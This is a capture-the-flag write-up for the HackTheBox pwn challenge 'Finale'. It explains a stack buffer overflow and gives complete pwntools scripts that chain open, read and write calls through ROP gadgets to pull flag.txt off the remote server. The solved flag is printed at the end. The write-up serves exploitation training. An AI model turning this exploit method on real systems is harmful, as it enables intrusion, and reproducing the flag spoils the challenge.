# Finale
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/74de6d8b-ee75-43e2-9e41-62f890ba249a)

## Lessons Learned:
1. Implement Open-Read-Write (ORW) ROP Chain exploit.

## DESCRIPTION:
It's the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true! Wish you the best for the upcoming year!

## STEPS:
1. In this challenge, we're given a 64 bit binary, dynamically linked, and not stripped.

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_final/challenge]
└─$ file finale 
finale: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ac92ca00b198dcf7287937f5ce21c1123a5a549e, for GNU/Linux 3.2.0, not stripped
```

> BINARY PROTECTIONS

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_final/challenge]
└─$ pwn checksec finale                         
[*] '/home/brandy/Downloads/pwn_final/challenge/finale'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

2. After decompiled the binary, found a potential BOF at the finale() function (line 12).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bc62844b-6743-4fad-a980-e7f31e7c2e28)


3. But notice there's a leaked stack address and based from the README.txt file, the problem setter told us not to do ret2libc because the remote server has a custom libc.
4. What comes to my mind we can do "seccomp-way", instead of spawn a shell, we grab the flag from the remote server.
5. Since it's not ret2shell challenge, hence don't need to worry about the flag.txt location.

### FLOW

```
Remembering there is leaked stack addres, hence we can use it to store the content of flag.txt.
Analyzing the source code, we can use open@plt, read@plt, and write@plt.
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e7e9bc7c-0cd1-462a-bbbf-fa969c2acc1c)


> Things to know

```
To use open we need rdi and rsi gadgets.
-> int open(const char *pathname, int flags);  
rdi is pointing to where we stored the flag.txt content, rsi holds the value for open (gonna use 0 --> read-only).

To use read, we need rdi, rsi, and rdx gadgets.
-> ssize_t read(int fd, void *buf, size_t count);  
rdi holds the file descriptor value, rsi holds the path (leaked stack address --> flag content), and rdx the buffer size to read.

To use write, we need rdi, rsi, and rdx gadgets.
-> ssize_t write(int fd, const void *buf, size_t count);  
rdi holds the file descriptor, rsi holds the path, and rdx holds the buffer size to be printed to us.
```

> PROBLEM

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9621dd15-dffa-446e-bf44-3373cd2327f3)


```
The problem here, we don't have pop rdx. But no need to worry about that, since read@plt and write@plt is declared at our source code, hopefully the rdx value holds enough buffer for us.
```

> CHECKING RDX HOLDS BY READ AND WRITE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1201a82f-9c48-4191-b27f-e2f1a53ed4c2)


```
Great! After the finale function called, the rdx value shall set to 0x54. It's enough.
```

6. After running the binary, it seems there is another leaked stack address.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/54bdc5f9-72dd-4455-a164-131db59e9279)


7. But after grab and unpack it, it resulting to unidentified address:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6f9cee75-9dd6-4c41-ba95-1a1afed8ec10)


8. Let's remove that from our interest and let's straight grabbed our leaked stack address at the finale() function and get the rip_offset.

> RIP OFFSET --> 72

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/edca4684-aedc-4655-95ea-13321f1236ed)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6cbb5629-f956-4454-bccb-3624f28da9d2)


9. Now let's grab our rdi, rsi gadgets. Here's our script so far.

```py
from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
continue
'''.format(**locals())

exe = './finale'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()
# sh.recvuntil('nonsense]: ')
# get = sh.recvline().strip()
# leaked = unpack(get.ljust(8, b'\x00'))
# log.success(f'LEAKED STACK ADDRESS (?) {hex(leaked)}')

sh.sendlineafter(b':', b's34s0nf1n4l3b00')
sh.recvuntil(b'luck:')
get_2 = sh.recvline().strip()
leaked_2 = get_2[1:15]
leaked_stack = int(leaked_2, 16)
# print(leaked_2)
log.success(f'LEAKED STACK ADDRESS --> {hex(leaked_stack)}')

rip_offset = 72

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f'RDI GADGET --> {hex(rdi)}')
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
log.info(f'RSI GADGET --> {hex(rsi)}')

sh.interactive()
```

> RESULT

```console
[+] Starting local process './finale': pid 43083
[+] LEAKED STACK ADDRESS --> 0x7ffdcc1e2f50
[*] Loaded 7 cached gadgets for './finale'
[*] RDI GADGET --> 0x4012d6
[*] RSI GADGET --> 0x4012d8
[*] Switching to interactive mode

[Strange man in mask]: Now, tell us a wish for next year: $
```

10. Now, before using the read@plt and write@plt, it's a good practice to check whether our open@plt payload is succeed or not.

> TESTING OPEN PAYLOAD

```py
from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
continue
'''.format(**locals())

exe = './finale'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()
# sh.recvuntil('nonsense]: ')
# get = sh.recvline().strip()
# leaked = unpack(get.ljust(8, b'\x00'))
# log.success(f'LEAKED STACK ADDRESS (?) {hex(leaked)}')

sh.sendlineafter(b':', b's34s0nf1n4l3b00')
sh.recvuntil(b'luck:')
get_2 = sh.recvline().strip()
leaked_2 = get_2[1:15]
leaked_stack = int(leaked_2, 16)
# print(leaked_2)
log.success(f'LEAKED STACK ADDRESS --> {hex(leaked_stack)}')

rip_offset = 72

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f'RDI GADGET --> {hex(rdi)}')
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
log.info(f'RSI GADGET --> {hex(rsi)}')

flag_str = b'flag.txt'
padding = rip_offset - len(flag_str) # calculate the correct padding
## OPEN PAYLOAD
p = flat([
    flag_str,
    b'\x00' * padding, # filled the rest after flag.txt with NULL bytes not NOPs.
    rdi, # rdi gadget
    leaked_stack, # holds the flag contents.
    rsi, # 
    0, #0x0 --> read-only mode
    elf.plt['open'], # open@plt
    elf.sym['finale'] # return to symbol.finale
])

sh.sendlineafter(b':', p)
sh.interactive()
```

> RESULT - WE RETURNED

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a727ca36-e5e6-4308-9a81-3dac13e253d5)


11. Great! I'm pretty confident now, let's send our read@plt and write@plt payload.

> FULL SCRIPT

```py
from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
continue
'''.format(**locals())

exe = './finale'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
# sh.recvuntil('nonsense]: ')
# get = sh.recvline().strip()
# leaked = unpack(get.ljust(8, b'\x00'))
# log.success(f'LEAKED STACK ADDRESS (?) {hex(leaked)}')

sh.sendlineafter(b':', b's34s0nf1n4l3b00')
sh.recvuntil(b'luck:')
get_2 = sh.recvline().strip()
leaked_2 = get_2[1:15]
leaked_stack = int(leaked_2, 16)
# print(leaked_2)
log.success(f'LEAKED STACK ADDRESS --> {hex(leaked_stack)}')

rip_offset = 72

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f'RDI GADGET --> {hex(rdi)}')
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
log.info(f'RSI GADGET --> {hex(rsi)}')

flag_str = b'flag.txt'
padding = rip_offset - len(flag_str) # calculate the correct padding
## OPEN PAYLOAD
p = flat([
    flag_str,
    b'\x00' * padding, # filled the rest after flag.txt with NULL bytes not NOPs.
    rdi, # rdi gadget
    leaked_stack, # holds the flag path
    rsi, # 
    0, #0x0 --> read-only mode
    elf.plt['open'], # open@plt
    elf.sym['finale'] # return to symbol.finale
])

sh.sendlineafter(b':', p)

### NOTES: Using fd --> 3, because at the start, the binary opens 3 fd (0,1,2) (stdin, stdout, stderr)
pay_2 = flat([
    ## READ PAYLOAD
    asm('nop') * rip_offset, # using rip_offset
    rdi, # rdi holds fd value
    3, # 0x3 , file descriptor (fd) set to 3
    rsi, # rsi is pointing to stack, it's reading the content
    leaked_stack, # our flag content
    elf.plt['read'], # read@plt
    # rdx
    # already allocated 0x54

    ## WRITE PAYLOAD
    rdi, # holds fd
    1, # stdout (fd --> 1)
    rsi, # print the content from leaked_stack
    leaked_stack, # flag content
    elf.plt['write'] # write@plt
    # rdx
    # already allocated 0x54
])

sh.sendlineafter(b'year:', pay_2)
sh.interactive()
```

> RESULT (LOCAL) - GOT THE TESTING FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/72970bf1-7a57-465c-92ab-5128d2be025b)


> RESULT (REMOTE)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ea132b58-fe0b-443c-a648-8a9e5af213d0)


## FLAG

```
HTB{wh0_n33d5_l1bc_wh3n_u_h4v3_st4ck_l45k5}
```
